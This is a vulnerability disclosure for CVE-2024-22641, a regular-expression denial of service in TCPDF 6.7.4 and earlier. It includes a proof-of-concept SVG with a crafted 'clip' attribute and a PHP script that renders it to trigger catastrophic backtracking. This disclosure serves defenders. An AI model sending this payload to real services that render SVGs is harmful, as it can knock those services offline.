# CVE-2024-22641

#### Vulnerability Type
Regular expression Denial of Service (ReDoS)

#### Affected Product and Version
TCPDF <= 6.7.4

#### Attack Vector
TCPDF parse SVG file contain crafted payload.

#### Description
TCPDF version <= 6.7.4 is vulnerable to ReDoS (Regular Expression Denial of Service) if parsing an untrusted SVG file.

#### PoC
```svg
<!--poc.svg-->
<svg
  version="1.1"
  xmlns="http://www.w3.org/2000/svg"
  xmlns:xlink="http://www.w3.org/1999/xlink">
  <circle clip="rect(0000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000!)"/>
</svg>
```

```php
<?php
require_once('../tcpdf.php');

// create new PDF document
$pdf = new TCPDF(PDF_PAGE_ORIENTATION, PDF_UNIT, PDF_PAGE_FORMAT, true, 'UTF-8', false);


// add a page
$pdf->AddPage();

$pdf->ImageSVG($file='poc.svg');
?>
```
> Note: Checking with **preg_last_error()** after the vulnerable line of code, the regEx will exit with **PREG_BACKTRACK_LIMIT_ERROR**.
